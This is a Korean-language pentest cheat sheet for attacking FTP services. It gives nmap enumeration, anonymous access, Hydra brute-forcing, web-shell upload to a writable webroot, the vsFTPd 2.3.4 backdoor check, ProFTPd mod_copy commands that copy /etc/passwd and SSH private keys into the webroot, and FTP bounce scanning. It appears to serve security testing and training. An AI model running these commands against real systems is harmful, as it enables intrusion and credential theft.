# FTP (21)

File Transfer Protocol. 인증 정보가 평문으로 전송되며, 종종 Anonymous 로그인이 허용된다.

---

## 열거

```bash
# 배너 및 버전
nmap -sV -sC -p 21 TARGET
nc -nv TARGET 21

# Anonymous 로그인 확인
ftp TARGET
> Name: anonymous
> Password: (빈 값 또는 아무 이메일)

# nmap NSE
nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 TARGET
```

---

## Anonymous 접근

```bash
ftp TARGET
> Name: anonymous
> Password:
ftp> ls -la
ftp> cd directory
ftp> get filename
ftp> mget *
ftp> put localfile

# 재귀 다운로드
wget -m ftp://anonymous:@TARGET/
wget -m --no-passive ftp://anonymous:@TARGET/
```

---

## 인증 공격

```bash
# Hydra
hydra -l user -P passwords.txt ftp://TARGET -t 10

# nxc
nxc ftp TARGET -u users.txt -p passwords.txt
```

---

## 공격

### 쓰기 가능한 FTP

```bash
# 웹루트와 연결된 FTP에 웹쉘 업로드
ftp> put webshell.php
ftp> put cmd.aspx

# 일반적인 웹루트 경로
# /var/www/html/  (Linux)
# C:\inetpub\wwwroot\  (Windows IIS)
```

### 알려진 취약점

```bash
# vsFTPd 2.3.4 Backdoor
nmap --script=ftp-vsftpd-backdoor -p 21 TARGET
# 포트 6200에 백도어 쉘 바인딩

# ProFTPd 1.3.3c - mod_copy
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# ProFTPd mod_copy로 SSH 키 탈취
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
```

### FTP Bounce Attack

```bash
# FTP 서버를 통한 포트 스캔 (NAT/방화벽 우회)
nmap -b user:pass@FTP_SERVER TARGET
```

---

## 유용한 FTP 명령어

```text
binary    # 바이너리 모드 (파일 손상 방지)
passive   # Passive 모드 (방화벽 문제 시)
prompt    # 대화형 확인 토글
mget *    # 모든 파일 다운로드
mput *    # 모든 파일 업로드
ls -la    # 숨겨진 파일 포함 목록
```
